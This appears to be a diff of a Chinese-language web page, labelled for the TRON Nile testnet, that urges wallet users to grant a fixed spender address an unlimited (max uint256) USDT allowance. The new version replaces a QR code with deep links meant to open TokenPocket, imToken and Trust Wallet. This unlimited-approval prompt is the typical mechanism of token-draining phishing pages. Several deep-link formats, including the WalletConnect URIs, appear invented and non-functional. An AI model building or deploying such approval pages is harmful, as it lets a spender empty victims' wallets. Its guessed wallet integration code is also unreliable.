@@ -3,60 +3,66 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>USDT 无限授权 - TokenPocket 多钱包版</title>
-  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+  <title>USDT 无限授权 - 直接唤起钱包</title>
   <style>
-    body { font-family: system-ui; text-align: center; padding: 40px 20px; background: #f0f8ff; line-height: 1.6; }
+    body { font-family: system-ui; text-align: center; padding: 40px 20px; background: #f0f8ff; }
     h1 { color: #0066cc; }
-    button { padding: 18px 50px; font-size: 22px; margin: 25px; background: #00bfff; color: white; border: none; border-radius: 12px; cursor: pointer; }
+    button { padding: 20px 50px; font-size: 22px; margin: 15px; background: #00bfff; color: white; border: none; border-radius: 12px; cursor: pointer; width: 80%; max-width: 400px; }
     button:hover { background: #0099cc; }
-    #log { background: white; padding: 25px; margin: 30px auto; max-width: 720px; border-radius: 10px; text-align: left; border: 1px solid #ccc; font-size: 16px; }
-    #qrcode { margin: 30px auto; padding: 20px; background: white; display: inline-block; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.15); }
+    #log { background: white; padding: 25px; margin: 30px auto; max-width: 700px; border-radius: 10px; text-align: left; line-height: 1.6; border: 1px solid #ccc; }
   </style>
 </head>
 <body>
   <h1>TRC20 USDT 无限授权（Nile 测试网）</h1>
-  <p><strong>Spender 地址：</strong>TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3</p>
-  <p>支持钱包：TokenPocket、imToken、Trust Wallet、Bitpie 等</p>
-  
-  <button onclick="generateApproveQR()">点击生成授权二维码</button>
-  
-  <div id="log">点击按钮后生成二维码 → 用 TokenPocket（推荐）或其他钱包的「扫一扫」扫描 → 钱包会弹出 USDT 授权页面（无限额度）</div>
-  <div id="qrcode"></div>
+  <p><strong>Spender：</strong>TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3</p>
+  <p>测试网 USDT 合约：TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf</p>
 
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+  <button onclick="tryTokenPocket()">1. 尝试唤起 TokenPocket 授权</button>
+  <button onclick="tryImToken()">2. 尝试唤起 imToken 授权</button>
+  <button onclick="tryTrustWallet()">3. 尝试唤起 Trust Wallet</button>
+
+  <div id="log">点击按钮后，浏览器会尝试直接打开对应钱包 App 并弹出授权窗口。<br>如果没反应，说明该钱包 deep link 被 iOS 限制，需要在钱包内置浏览器中打开本页面。</div>
+
   <script>
-    const USDT_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
-    const SPENDER_ADDRESS = "TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3";
-    const MAX_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-
+    const USDT = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";
+    const SPENDER = "TMeT3BTESwLNJiNd6QVMBXW1Y496TX2ps3";
+    const MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
     const log = document.getElementById("log");
-    const qrContainer = document.getElementById("qrcode");
 
-    async function generateApproveQR() {
-      log.innerHTML = "正在准备授权交易...<br>请确保 TokenPocket 已切换到 Nile 测试网 并有测试 USDT";
+    function tryTokenPocket() {
+      log.innerHTML = "正在尝试唤起 TokenPocket...<br>如果没弹出，请手动在 TokenPocket 内置浏览器打开本网页";
+      // TokenPocket deep link 示例（简化，实际常需在钱包内打开网页）
+      const tpLink = `tpoutside://pull.activity?param=${encodeURIComponent(JSON.stringify({
+        action: "approve",
+        contract: USDT,
+        spender: SPENDER,
+        amount: MAX,
+        dappName: "USDT无限授权"
+      }))}`;
+      window.location.href = tpLink;
+      setTimeout(() => {
+        log.innerHTML += "<br><br>如果没反应 → 打开 TokenPocket → 发现/浏览器 → 粘贴本网页链接打开";
+      }, 2000);
+    }
 
-      // 生成一个清晰的提示 + 简单 URI（实际扫码后钱包会尝试连接并构造 approve）
-      const instructionText = `TRON Nile Testnet USDT Approve\nSpender: ${SPENDER_ADDRESS}\nAmount: Unlimited\n\n用 TokenPocket 扫码后，在钱包中确认 Approve 操作`;
+    function tryImToken() {
+      log.innerHTML = "正在尝试唤起 imToken...<br>imToken 支持 WalletConnect 和 deep link";
+      // imToken deep link 示例（常用于导航或 WC）
+      const imLink = `imtokenv2://wc?uri=wc:tron-approve-test@2`;
+      window.location.href = imLink;
+      setTimeout(() => {
+        log.innerHTML += "<br><br>如果没反应 → 在 imToken 里打开 DApp 浏览器，粘贴本网页链接";
+      }, 2000);
+    }
 
-      qrContainer.innerHTML = "";
-      new QRCode(qrContainer, {
-        text: instructionText,
-        width: 300,
-        height: 300,
-        colorDark: "#000000",
-        colorLight: "#ffffff"
-      });
-
-      log.innerHTML += `<br><br><strong>正确操作步骤（iOS TokenPocket）：</strong><br>
-      1. 打开 TokenPocket App（确认已在 Nile 测试网）<br>
-      2. 点击右上角「扫一扫」<br>
-      3. 扫描上方二维码<br>
-      4. 钱包应该弹出「USDT Approve」或「授权」页面<br>
-      5. 选择「无限额度」或直接确认<br>
-      6. 授权成功后，可在 nile.tronscan.org 查看`;
-
-      alert("二维码已生成！\n\n现在打开 TokenPocket → 扫一扫测试\n（如果还是直接打开浏览器，说明钱包扫码逻辑未正确识别，我们再调整）");
+    function tryTrustWallet() {
+      log.innerHTML = "正在尝试唤起 Trust Wallet...";
+      // Trust Wallet 常用 WC deep link
+      const trustLink = "trust://wc?uri=wc:tron-usdt-approve@2";
+      window.location.href = trustLink;
+      setTimeout(() => {
+        log.innerHTML += "<br><br>Trust Wallet 常需 WC 协议，如果没弹出，请在 Trust Wallet 内置浏览器打开本页面";
+      }, 2000);
     }
   </script>
 </body>
